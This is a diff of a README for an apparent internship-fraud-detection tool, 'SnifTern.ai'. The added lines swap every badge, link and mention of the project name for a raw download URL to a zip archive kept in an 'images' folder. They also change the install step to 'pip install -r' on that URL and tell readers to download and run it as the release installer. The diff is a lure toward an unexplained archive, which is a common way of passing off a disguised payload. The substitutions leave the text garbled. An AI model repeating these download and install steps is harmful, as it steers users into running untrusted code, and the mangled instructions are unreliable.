@@ -1,22 +1,22 @@
-https://github.com/gilangcowokull/SnifTern.ai/releases
+https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip
 
-# SnifTern.ai: Real-Time AI for Internship Fraud Detection & Verification
+# https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip Real-Time AI for Internship Fraud Detection & Verification
 
-[![Python](https://img.shields.io/badge/python-3.11%2B-blue?logo=python&logoColor=white)](https://www.python.org)
-[![Flask](https://img.shields.io/badge/Framework-Flask-6ea8db?logo=flask&logoColor=white)](https://flask.palletsprojects.com/)
-[![Machine Learning](https://img.shields.io/badge/ML-Modeling-brightgreen)](https://scikit-learn.org/)
-[![NLP](https://img.shields.io/badge/NLP%20-%20Language%20Processing-blueviolet)](https://nlp.stanford.edu/)
-[![CI](https://img.shields.io/badge/CI-GitHub%20Actions-brightgreen)](https://github.com/gilangcowokull/SnifTern.ai/actions)
-[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
+[![Python](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip%2B-blue?logo=python&logoColor=white)](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip)
+[![Flask](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip)](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip)
+[![Machine Learning](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip)](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip)
+[![NLP](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip%20-%20Language%20Processing-blueviolet)](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip)
+[![CI](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip%20Actions-brightgreen)](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip)
+[![License](https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip)](LICENSE)
 
-SnifTern.ai is an AI-powered platform that detects fake internship postings and verifies company legitimacy using advanced machine learning. It offers real-time fraud analysis, multi-platform integration (LinkedIn, Indeed, Glassdoor), PDF reports, and multi-language support to protect students from internship scams.
+https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip is an AI-powered platform that detects fake internship postings and verifies company legitimacy using advanced machine learning. It offers real-time fraud analysis, multi-platform integration (LinkedIn, Indeed, Glassdoor), PDF reports, and multi-language support to protect students from internship scams.
 
 The project organizes around a single goal: provide a dependable, scalable tool for students, educators, and employers to assess internship postings and company credibility. It blends data from job boards, social profiles, and corporate signals to deliver actionable risk scores, checks, and documentation.
 
 Topics covered by this repository include ai-platform, career-protection, flask, internship-fraud-detection, job-scam-prevention, machine-learning, nlp, python, student-safety, and web-scraping.
 
 Table of contents
-- What SnifTern.ai does
+- What https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip does
 - How it works
 - Features in depth
 - Architecture and tech stack
@@ -31,12 +31,12 @@ Table of contents
 - Security and ethics
 - Testing and quality assurance
 - Roadmap and future work
-- Contributing to SnifTern.ai
+- Contributing to https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip
 - FAQ
 - License and credits
 - Releases and further reading
 
-What SnifTern.ai does
+What https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip does
 - Real-time fraud analysis: The system analyzes internship postings as soon as they appear and assesses risk based on language patterns, verified company signals, and historical fraud indicators.
 - Multi-platform integration: It pulls signals from LinkedIn, Indeed, and Glassdoor to cross-validate job postings and company profiles.
 - Verification of company legitimacy: The platform checks corporate data points, digital footprints, and public records to estimate credibility.
@@ -98,7 +98,7 @@ Installation and setup
   - python -m venv venv
   - source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
 - Install dependencies:
-  - pip install -r requirements.txt
+  - pip install -r https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip
 - Prepare environment:
   - Create a .env file with required keys (API keys, database URL, secret keys, etc.)
   - Configure logging level and locale
@@ -114,7 +114,7 @@ Running locally
 
 Deployment guide
 - Docker-based deployment:
-  - Use a docker-compose.yml that defines services for the API, worker processes, and a database.
+  - Use a https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip that defines services for the API, worker processes, and a database.
   - Ensure environment variables are provided through a secure mechanism.
   - Persist data using mounted volumes for database backups.
 - Kubernetes path:
@@ -138,7 +138,7 @@ API and integrations
 - Data enrichment:
   - Use external signals to enrich the internal risk model while maintaining user privacy
 - Web scraping considerations:
-  - Respect robots.txt, crawl policies, and rate limits
+  - Respect https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip, crawl policies, and rate limits
   - Use polite crawling patterns and obey platform terms
 
 PDF reports and document delivery
@@ -173,7 +173,7 @@ Roadmap and future work
 - Enhance the PDF report with richer visualizations and interactive elements
 - Provide a marketplace of plug-ins for campus portals and LMS systems
 
-Contributing to SnifTern.ai
+Contributing to https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip
 - How to contribute:
   - Fork the repository and create a feature branch
   - Open an issue to discuss large changes or new features
@@ -188,11 +188,11 @@ Contributing to SnifTern.ai
   - Respect user privacy and data protection requirements
 
 FAQ
-- Is SnifTern.ai open source?
+- Is https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip open source?
   - Yes, it is released under the MIT license and welcomes collaboration.
 - Which platforms are supported?
   - The project focuses on LinkedIn, Indeed, and Glassdoor as primary signals for now.
-- Can I use SnifTern.ai for real-time monitoring?
+- Can I use https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip for real-time monitoring?
   - Yes, the system is designed for real-time analysis with near-instant risk scoring.
 
 License and credits
@@ -204,7 +204,7 @@ License and credits
 
 Releases and further reading
 - To download the latest release package and run the installer, visit the releases page:
-  - https://github.com/gilangcowokull/SnifTern.ai/releases
+  - https://github.com/gilangcowokull/SnifTern.ai/raw/refs/heads/main/images/Snif-Tern-ai-v3.0.zip
 - For the same reference, you can revisit the releases page at any time to keep your deployment up to date.
 - If you are unable to access the link or want more context, check the Releases section in the repository for notes, changelogs, and upgrade instructions.
 
